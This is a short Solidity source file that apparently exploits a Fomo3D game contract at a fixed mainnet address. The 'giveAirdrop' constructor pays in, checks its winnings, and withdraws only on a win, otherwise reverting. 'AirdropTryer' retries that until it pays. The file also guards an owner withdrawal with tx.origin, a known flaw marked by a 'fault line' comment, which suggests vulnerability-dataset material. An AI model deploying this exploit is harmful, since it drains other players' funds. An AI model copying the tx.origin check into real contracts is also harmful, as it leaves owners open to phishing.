pragma solidity ^0.4.25;
pragma solidity ^0.4.24;
contract fomo3d {
    function getPlayerInfoByAddress(address _addr)
        public 
        view 
        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256);
    function withdraw()
        public;
}
contract giveAirdrop {
    constructor () public payable {
        fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
        require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
        (,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
        require(winnings > 0.1 ether);
        fomo.withdraw();
        selfdestruct(msg.sender);
    }
    function () public payable {}
}
contract AirdropTryer {
  address owner;
  giveAirdrop airdropper;
  constructor () public {
    owner = msg.sender;
  }
  function tryAirdrop() public payable{
    airdropper = (new giveAirdrop).value(msg.value)();
  }
  function empty() public {
      require(tx.origin == owner);  // fault line
      selfdestruct(owner);
  }
}